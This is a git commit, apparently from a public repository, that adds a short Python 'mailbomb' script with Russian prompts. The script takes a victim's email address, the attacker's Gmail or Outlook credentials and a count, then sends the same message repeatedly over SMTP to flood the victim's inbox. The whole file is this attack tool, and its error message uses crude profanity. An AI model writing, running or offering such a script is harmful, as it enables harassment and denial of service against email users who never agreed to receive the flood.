66635de9d0f77a2c11f2620b0c8eff19bfc43917
screaze <91967355+screaze@users.noreply.github.com>
2021-10-25 03:18:59 +0300

    Create mailbomb.py

---
+++ mailbomb.py
@@ -0,0 +1,28 @@
+import smtplib
+import time
+try:
+    bomb_email = input("Введите email для атаки > ")
+    email = input("Введите gmail с которого будете атаковать > ")
+    password = input("Введите пароль от gmail > ")
+    message = input("Введите сообщение > ")
+    counter = int(input("Сколько хотите сообщений? > "))
+
+    # gmail of outlook
+    s_ = input('Выбери провайдера (gmail/outlook) > ').lower()
+
+    if s_ == "gmail":
+        mail = smtplib.SMTP('smtp.gmail.com',587)
+    elif s_ == "outlook":
+        mail = smtplib.SMTP('smtp.office365.com',587)
+
+    for x in range(0,counter):
+        print("Номер сообщения > ", x+1)
+        mail.ehlo()
+        mail.starttls()
+        mail.login(email,password)
+        mail.sendmail(email,bomb_email,message)
+        time.sleep(1)
+
+    mail.close()
+except Exception as e:
+    print("блять ошибка проверь инпуты сука/настройки гугла")
